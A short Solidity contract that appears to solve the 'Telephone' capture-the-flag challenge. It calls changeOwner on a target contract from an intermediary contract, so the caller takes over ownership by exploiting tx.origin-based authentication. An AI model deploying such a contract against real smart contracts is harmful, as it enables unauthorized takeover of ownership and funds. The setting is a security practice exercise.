pragma solidity ^0.8.0;

interface ITelephone  {
    function changeOwner(address _owner) external;
}

contract TelephoneSolver {
    ITelephone challenge;

    constructor(address addr) {
        challenge = ITelephone(addr);
    }

    function solve() external payable {
        challenge.changeOwner(msg.sender);
    }

    receive() external payable {}
}
